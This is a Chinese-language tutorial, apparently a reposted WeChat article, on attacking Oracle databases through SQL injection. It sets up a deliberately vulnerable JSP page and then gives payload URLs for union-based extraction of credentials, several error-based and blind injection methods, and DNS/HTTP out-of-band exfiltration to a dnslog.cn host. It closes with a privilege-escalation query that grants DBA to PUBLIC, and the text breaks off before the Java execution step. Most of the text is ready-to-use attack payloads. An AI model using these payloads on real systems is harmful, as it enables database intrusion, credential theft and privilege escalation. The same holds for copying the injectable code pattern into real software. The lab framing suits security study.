> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZjPWu_ZtUaoHvIdUS6nvng)

Oracle 数据库的基本知识
---------------

### Oracle 数据库介绍

Oracle Database，又名 Oracle RDBMS，或简称 Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说 Oracle 数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。

Oracle 对于 MYSQL、MSSQL 来说意味着更大的数据量，更大的权限。

Oracle 服务默认端口：1521

### Oracle 权限分类

权限是用户对一项功能的执行权力。在 Oracle 中，根据系统管理方式不同，将 Oracle 权限分为系统权限与实体权限两类。系统权限是指是否被授权用户可以连接到数据库上，在数据库中可以进行哪些系统操作。而实体权限是指用户对具体的模式实体 (schema) 所拥有的权限。

系统权限：系统规定用户使用数据库的权限。（系统权限是对用户而言)。

实体权限：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）。

#### 系统权限管理

—— 系统权限分类 ——

•DBA: 拥有全部特权，是系统最高权限，只有 DBA 才可以创建数据库结构。•RESOURCE: 拥有 Resource 权限的用户只可以创建实体，不可以创建数据库结构。•CONNECT: 拥有 Connect 权限的用户只可以登录 Oracle，不可以创建实体，不可以创建数据库结构。

对于普通用户：授予 connect, resource 权限。

对于 DBA 管理用户：授予 connect，resource, dba 权限。

```
系统权限授权命令： 系统权限只能由DBA用户授出：sys, system(最开始只能是这两个用户) 授权命令：SQL> grant connect, resource, dba to 用户名1 [,用户名2]…; 注:普通用户通过授权可以具有与system相同的用户权限，但永远不能达到与sys用户相同的权限，system用户的权限也可以被回收。 例： SQL> connect system/manager SQL> Create user user50 identified by user50; SQL> grant connect, resource to user50;

查询用户拥有哪里权限： SQL> select from dba_role_privs; SQL> select from dba_sys_privs; SQL> select * from role_sys_privs;

查自己拥有哪些系统权限 SQL> select * from session_privs;

删除用户 SQL> drop user 用户名 cascade; //加上cascade则将用户连同其创建的东西全部删除

系统权限传递：增加WITH ADMIN OPTION选项，则得到的权限可以传递。 SQL> grant connect, resorce to user50 with admin option; //可以传递所获权限。

系统权限回收：系统权限只能由DBA用户回收 SQL> Revoke connect, resource from user50;

说明： 1）如果使用WITH ADMIN OPTION为某个用户授予系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限并不会级联取消这些用户的相同权限。 2）系统权限无级联，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨用户回收，即A可以直接收回C用户的权限。
```

#### 实体权限管理

—— 实体权限分类 ——

•select, update, insert, alter, index, delete, all //all 包括所有权限 •execute // 执行存储过程权限

```
user01: SQL> grant select, update, insert on product to user02; SQL> grant all on product to user02;

user02: SQL> select * from user01.product; // 此时user02查user_tables，不包括user01.product这个表，但如果查all_tables则可以查到，因为他可以访问。

将表的操作权限授予全体用户： SQL> grant all on product to public; // public表示是所有的用户，这里的all权限不包括drop。

实体权限数据字典 SQL> select owner, table_name from all_tables; // 用户可以查询的表 SQL> select table_name from user_tables; // 用户创建的表 SQL> select grantor, table_schema, table_name, privilege from all_tab_privs; // 获权可以存取的表（被授权的） SQL> select grantee, owner, table_name, privilege from user_tab_privs; // 授出权限的表(授出的权限)

DBA用户可以操作全体用户的任意基表(无需授权，包括删除)：

DBA用户： SQL> Create table stud02.product( id number(10), name varchar2(20)); SQL> drop table stud02.emp;

SQL> create table stud02.employee as select * from scott.emp;

实体权限传递(with grant option)：

user01: SQL> grant select, update on product to user02 with grant option; // user02得到权限，并可以传递。

实体权限回收：

user01: SQL>Revoke select, update on product from user02; //传递的权限将全部丢失。

说明 1）如果取消某个用户的对象权限，那么对于这个用户使用WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权时级联的。
```

#### 管理角色

```
建一个角色 sql>create role role1;

授权给角色 sql>grant create any table,create procedure to role1;

授予角色给用户 sql>grant role1 to user1;

查看角色所包含的权限 sql>select * from role_sys_privs;

创建带有口令以角色(在生效带有口令的角色时必须提供口令) sql>create role role1 identified by password1;

修改角色：是否需要口令 sql>alter role role1 not identified; sql>alter role role1 identified by password1;

设置当前用户要生效的角色 (注：角色的生效是一个什么概念呢？假设用户a有b1,b2,b3三个角色，那么如果b1未生效，则b1所包含的权限对于a来讲是不拥有的，只有角色生效了，角色内的权限才作用于用户，最大可生效角色数由参数MAX_ENABLED_ROLES设定；在用户登录后，oracle将所有直接赋给用户的权限和用户默认角色中的权限赋给用户。） sql>set role role1; //使role1生效 sql>set role role,role2; //使role1,role2生效 sql>set role role1 identified by password1; //使用带有口令的role1生效 sql>set role all; //使用该用户的所有角色生效 sql>set role none; //设置所有角色失效 sql>set role all except role1; //除role1外的该用户的所有其它角色生效。 sql>select * from SESSION_ROLES; //查看当前用户的生效的角色。

修改指定用户，设置其默认角色 sql>alter user user1 default role role1; sql>alter user user1 default role all except role1;

删除角色 sql>drop role role1;

角色删除后，原来拥用该角色的用户就不再拥有该角色了，相应的权限也就没有了。

说明: 1)无法使用WITH GRANT OPTION为角色授予对象权限 2)可以使用WITH ADMIN OPTION 为角色授予系统权限,取消时不是级联
```

### PL/SQL 语言

PL/SQL 也是一种程序语言，叫做过程化 SQL 语言（Procedual Language/SQL）。

PL/SQL 是 Oracle 数据库对 SQL 语句的扩展。在普通 SQL 语句的使用上增加了编程语言的特点，所以 PL/SQL 就是把数据操作和查询语句组织在 PL/SQL 代码的过程性单元中，通过逻辑判断、循环等操作实现复杂的功能或者计算的程序语言。在 PL/SQL 编程语言是由甲骨文公司在 20 世纪 80 年代，作为 SQL 程序扩展语言和 Oracle 关系数据库开发。

基本存储过程结构：

```
DECLARE
    <declarations section>
BEGIN
    <executable command(s)>
EXCEPTION
    <exception handing>
END;
```

### SQL 注入需注意的规则

1.Oracle 使用查询语言获取需要跟上表名，这一点和 Access 类似，没有表的情况下可以使用 dual 表，dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。2.Oracle 的数据库类型是强匹配，所以在 Oracle 进行类似 Union 查询数据时必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用 NULL 代替某些无法快速猜测出的数据类型位置，这一点和 SQLServer 类似。3.Oracle 和 mysql 不一样，分页中没有 limit，而是使用三层查询嵌套的方式实现分页 例如: `SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM <= 1 ) WHERE RN >=0`4.Oracle 的单行注释符号是`--`，多行注释符号`/**/`。5.Oracle 数据库包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，如 user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中 table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名。6.Oracle 使用`||`拼接字符串（在 URL 中使用编码`%7c`表示），`concat()`函数也可以实现两个字符串的拼接

### 实验环境

• 操作系统：Windows Server 2008R2• 数据库：Microsoft SQL Server 2008R2•Web 服务器：Tomcat 7.0• 脚本语言：jsp• 源代码：index.jsp•  本地域名配置：hackrock.com:8080

```
<%@ page language="java" import="java.util.*"  pageEncoding="utf-8"%>
<%@ page import="oracle.jdbc.*"%>
<%@ page import="java.sql.*" %>
<%@ page import="oracle.sql.*" %>

<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>Oracle注入测试</title>
        <meta http-equiv="pragma" content="no-cache">
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="expires" content="0">    
        <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
        <meta http-equiv="description" content="This is my page">
        <!--
        <link rel="stylesheet" type="text/css" href="styles.css" mce_href="styles.css">
        -->
  </head>
  
  <body> 
    <%
        String  url  =  "http://"  +  request.getServerName()  +  ":"  +  request.getServerPort()  +  request.getContextPath()+request.getServletPath();
            Class.forName("oracle.jdbc.driver.OracleDriver").newInstance();
            Statement stmt = null;
            ResultSet rs=null;
            String oraUrl="jdbc:oracle:thin:@127.0.0.1:1521:orcl";
            String oraUser="TEST";
            String oraPWD="123456";
            try
            {
                    DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());
            }catch (SQLException e)
            {
                out.print("filed!!");
            }
            try
            {
                Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);
                String sql="select * from news where id="+request.getParameter("id");
                out.print("执行语句:<br>"+sql+"<br>");
                stmt = conn.createStatement();
                rs = stmt.executeQuery(sql);
                out.print("结果为:");
                out.print("<table border='1' cellpadding='4' cellspacing='0' style='background-color:White;border-color:#3366CC;border-width:1px;border-style:None;width:203px;border-collapse:collapse;'>");
                out.print("<tr style='color:#CCCCFF;background-color:#003399;font-weight:bold;'>");
                out.print("<td>id</td><td>title</td><td>content</td>");
                out.print("</tr>");
                out.print("<tr style='color:#003399;background-color:White;'>");
                while(rs.next())
                {
                        out.print("<td>");out.print(rs.getString(1));out.print("</td>");
                        out.print("<td>");out.print(rs.getString(2));out.print("</td>");
                        out.print("<td>");out.print(rs.getString(3));out.print("</td>");
                }
                out.print("<tr>");
                rs.close();
                stmt.close();
                conn.close();
            } catch (SQLException e)
            {
                    System.out.println(e.toString());
                    out.print(e.toString());
            }
     %>
  </body>
</html>
```

联合查询注入
------

判断注入点的方式与之前的数据库注入一样，就不详细讲了。

### 判断查询列数

依旧提交 order by 去猜测显示当前页面所用的 SQL 查询了多少个字段，也就是确认查询字段数。

```
http://hackrock.com:8080/oracle/?id=1 order by 3 --+

http://hackrock.com:8080/oracle/?id=1 order by 4 --+
```

### 判断回显位

```
http://hackrock.com:8080/oracle/?id=-1 union select null,null,null from dual --+

http://hackrock.com:8080/oracle/?id=-1 union select 1,'2','3' from dual --+
```

### 获取数据库基本信息

```
获取数据库版本
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select banner from sys.v_$version where rownum=1 ),'3' from dual --+        

获取数据库的实例名(SYS用户才可查询)
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select instance_name from v_$instance),'3' from dual --+    
```

### 获取用户名

Oracle 没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。

```
获取第一个用户名
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1),'3' from dual --+    

获取第二个用户名
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1 and username<>'SYS'),'3' from dual --+    

获取当前用户名
http://hackrock.com:8080/oracle/?id=-1 union select 1,(SELECT user FROM dual),'3' from dual --+
```

### 获取表名

```
获取TEST用户的第一张表
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner='TEST'),'3' from dual --+

获取TEST用户的第二张表
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner='TEST' and table_name<>'NEWS'),'3' from dual --+
```

### 获取字段名

```
获取TEST用户的USERS表的第一个列名
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1),'3' from dual --+    

获取TEST用户的USERS表的第二个列名
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1 and column_name<>'ID'),'3' from dual --+    
```

### 获取数据

```
http://hackrock.com:8080/oracle/?id=-1 union select 1,(select concat(concat(username,'~~'),password) from users where rownum=1),null from dual --+    
```

报错注入
----

在 oracle 注入时候出现了数据库报错信息，可以优先选择报错注入，使用报错的方式将查询数据的结果带出到错误页面中。

使用报错注入需要使用类似 1=[报错语句]，1>[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL 仅使用函数报错即可），类似 mssql 报错注入的方式。

### utl_inaddr.get_host_name() 函数报错注入

`utl_inaddr.get_host_address` 本意是获取 ip 地址，但是如果传递参数无法得到解析就会返回一个 oracle 错误并显示传递的参数。

我们传递的是一个 sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name('~'%7c%7c(select user from dual)%7c%7c'~') --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') --+
```

### ctxsys.drithsx.sn() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select user from dual)%7c%7c'~') --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,'~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') --+
```

### dbms_xdb_version.checkin() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') from dual) is not null --+
```

### dbms_xdb_version.makeversioned() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') from dual) is not null --+
```

### dbms_xdb_version.uncheckout() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') from dual) is not null --+
```

### dbms_utility.sqlid_to_sqlhash() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') from dual) is not null --+
```

### ordsys.ord_dicom.getmappingxpath() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath('~'%7c%7c(select user from dual)%7c%7c'~') from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath('~'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'~') from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath('~'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'~') from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath('~'%7c%7c(select username from test.users where rownum=1)%7c%7c'~') from dual) is not null --+
```

### XMLType() 函数报错注入

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+

获取表名
http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7cchr(62))) from dual) is not null --+

获取字段名
http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7cchr(62))) from dual) is not null --+

获取数据
http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select username from test.users where rownum=1)%7c%7cchr(62))) from dual) is not null --+
```

布尔型盲注
-----

### decode() 函数布尔盲注

`decode(字段或字段的运算，值1，值2，值3）`

这个函数运行的结果是，当字段或字段的运算的值等于值 1 时，该函数返回值 2，否则返回 3。

当然值 1，值 2，值 3 也可以是表达式，这个函数使得某些 sql 语句简单了许多。

使用方法：

比较大小

```
select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值
```

sign() 函数根据某个值是 0、正数还是负数，分别返回 0、1、-1

例如：

变量 1=10，变量 2=20，则`sign(变量1-变量2)`返回 - 1，decode 解码结果为 “变量 1”，达到了取较小值的目的。

```
select decode(sign(10-20),-1,10,20) from dual;                   
```

**猜解当前用户**

```
判断是否是TEST用户
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(user,'TEST',1,0) from dual) --+

也可利用substr()函数进行逐一猜解
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner='TEST'),1,1),'T',1,0) from dual) --+
```

**猜解表名**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner='TEST'),1,1),'N',1,0) from dual) --+
```

**猜解字段名**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1),1,1),'I',1,0) from dual) --+
```

**猜解数据**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select username from test.users where rownum=1),1,1),'a',1,0) from dual) --+
```

### instr() 函数布尔盲注

instr 函数的使用，从一个字符串中查找指定子串的位置。例如：

```
select instr('abcdef123de','de') position from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXL3Q3tMiayXqco2ptoKOGdsI7dF8MApiclx0ib4QVb4Ga529bGUsGpqXjw/640?wx_fmt=png)

043da52fbdd3d786b78a7384caa9c6c7.png

从 1 开始算 de 排第四所以返回 4

**布尔盲注中的应用**

```
http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),'S'))=1 --+
http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),'SY'))=1 --+
http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),'SYS'))=1 --+
```

payload 构造如上。

### substr() 函数布尔盲注

**获取数据长度**

```
http://hackrock.com:8080/oracle/?id=1 and (select length(user) from dual)=3 --+
```

**猜解 ASCII 码**

```
http://hackrock.com:8080/oracle/?id=1 and (select ascii(substr(user,1,1))from dual)>65 --+
```

payload 构造如上。

时间型盲注
-----

oracle 注入中可以通过页面响应的状态，这里指的是响应时间，通过这种方式判断 SQL 是否被执行的方式，便是时间盲注。

oracle 的时间盲注通常使用`DBMS_PIPE.RECEIVE_MESSAGE()`，而另外一种便是`decode()`与高耗时 SQL 操作的组合，当然也可以是 case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：`(select count(*) from all_objects)`，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。

### dbms_pipe.receive_message() 函数时间盲注

`DBMS_LOCK.SLEEP()`函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。

首先，不能直接将该函数注入子查询中，因为 Oracle 不支持堆叠查询 (stacked query)。其次，只有数据库管理员才能使用`DBMS_LOCK`包。

在 Oracle PL/SQL 中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：

`dbms_pipe.receive_message('RDS', 10)`

`DBMS_PIPE.RECEIVE_MESSAGE()`函数将为从 RDS 管道返回的数据等待 10 秒。默认情况下，允许以`public`权限执行该包。`DBMS_LOCK.SLEEP()`与之相反，它是一个可以用在 SQL 语句中的函数。

**查看是否可以使用 dbms_pipe.receive_message() 函数进行延时注入**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(dbms_pipe.receive_message('RDS',5)) --+
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXPicYtZU2uWXr1M5NXbBA1rP0a4JuojPdeb9DpwtgSR0KwibFdR4X0Lyg/640?wx_fmt=png)

c73218c0384317c32b1796c080b43cad.png

来自官网的 DBMS_PIPE.RECEIVE_MESSAGE 语法：

```
DBMS_PIPE.RECEIVE_MESSAGE (
   pipename     IN VARCHAR2,
   timeout      IN INTEGER      DEFAULT maxwait)
RETURN INTEGER;
```

**具体 payload 构造：**

**猜解当前用户**

```
http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(user as varchar(4000)),chr(32)) from dual),1,1)) > 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+
```

**猜解表名**

```
http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(table_name as varchar(4000)),chr(32)) from all_tables where rownum=1 and owner='TEST'),1,1)) > 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+
```

**猜解字段**

```
http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(column_name as varchar(4000)),chr(32)) from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1),1,1)) > 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+
```

**猜解数据**

```
http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(username as varchar(4000)),chr(32)) from test.users where rownum=1),1,1)) > 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+
```

### decode() 函数时间盲注

`（select count(*) from all_objects)`会花费更多时间去查询所有数据库的条目。不过在使用的过程中有很多不尽如人意的地方，有时候加载快有时加载慢。

**时间盲注的应用**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual)
```

payload 构造如上。

### decode() 与 dbms_pipe.receive_message() 嵌套时间盲注

**时间盲注的应用**

```
http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS', 5),0) from dual)
```

payload 构造如上。

DNS 带外通信注入
----------

Oracle 注入之带外通信和 DNSLOG 注入非常相似，例如和 mysql 中 load_file() 函数实现无回显注入非常相似。

Oracle 发送 HTTP 和 DNS 请求，并将查询结果带到请求中，然后检测外网服务器的 HTTP 和 DNS 日志，从日志中获取查询结果，通过这种方式将繁琐的盲注转换成可以直接获取查询结果的方式。

使用第三方平台，监听访问请求，并记录请求的日志信息，然后使用`utl_http.request()`向外网主机发送 http 请求，请求便携带了查询的结果信息。此处可以结合 SSRF 进行内网探测。或许这就是 Oracle 的 SSRF。

利用`utl.inaddr.get_host_address()`，将查询结果拼接到域名下，并使用 DNS 记录解析日志，通过这种方式获取查询结果。

### 检测是否支持 utl_http.request

```
http://hackrock.com:8080/oracle/?id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --+
```

若页面返回正常，这说明支持 utl_http.request

### 构造 payload

```
获取用户名
http://hackrock.com:8080/oracle/?id=1 and utl_http.request('http://'%7c%7c(select user from dual)%7c%7c'.z9mt3s.dnslog.cn/oracle')=1--+

获取表名
http://hackrock.com:8080/oracle/?id=1 and utl_http.request('http://'%7c%7c(select table_name from all_tables where rownum=1 and owner='TEST')%7c%7c'.z9mt3s.dnslog.cn/oracle')=1--+

获取列名
http://hackrock.com:8080/oracle/?id=1 and utl_http.request('http://'%7c%7c(select column_name from all_tab_columns where owner='TEST' and table_name='USERS' and rownum=1)%7c%7c'.z9mt3s.dnslog.cn/oracle')=1--+

获取数据
http://hackrock.com:8080/oracle/?id=1 and utl_http.request('http://'%7c%7c(select username from test.users where rownum=1)%7c%7c'.z9mt3s.dnslog.cn/oracle')=1--+
```

利用漏洞提权执行命令
----------

Oracle 提权漏洞集中存在于 PL/SQL 编写的函数、存储过程、包、触发器中。Oracle 存在提权漏洞的一个重要原因是 PL/SQL 定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。

即，无论调用者权限如何，执行存储过程的结果权限永远为定义者权限，因此，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，较低权限的用户即可利用这个存储过程提权。

Java 作为 Oracle 公司的主打语言，具有内置的安全性机制和高效的垃圾收集系统。Java 还具有一组非常大的、丰富的标准库，从而可以更快、更低成本地开发应用程序。因此 Oracle 公司在它的 Oracle 数据库中，同样支持了使用 Java 来编写存储过程。

那么对于攻击者来说，完全可以通过这一特性，在系统上执行 Java 代码，从而完成提权操作。

**攻击流程**：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXYBNGMnse4aIMEgBtoHBM7ymWfnqpbvKOibxT2MpjTNU4MfA5LG8RGLw/640?wx_fmt=png)

859e8d3edbce11899c6415bfac2e25ee.png

**本文测试环境均为**：

> CentOS Linux release 7.2.1511 (Core)
> 
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production

执行方式很多种，这边只研究 Oracle10g，并且本地实测成功的

•`DBMS_EXPORT_EXTENSION()`•`dbms_xmlquery.newcontext()`•`DBMS_JAVA_TEST.FUNCALL()`

### dbms_export_extension()

> • 影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)• 权限：None• 详情：这个软件包有许多易受 PL/SQL 注入攻击的函数。这些函数由 SYS 拥有，作为 SYS 执行并且可由 PUBLIC 执行。因此，如果 SQL 注入处于上述任何未修补的 Oracle 数据库版本中，那么攻击者可以调用该函数并直接执行 SYS 查询。

#### 提升权限

该请求将导致查询 "GRANT DBA TO PUBLIC" 以 SYS 身份执行。因为这个函数允许 PL / SQL 缺陷（PL / SQL 注入）。一旦这个请求成功执行，PUBLIC 获取 DBA 角色，从而提升当前 user 的特权

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

#### 使用 Java 执行

**创建 Java 库**

```
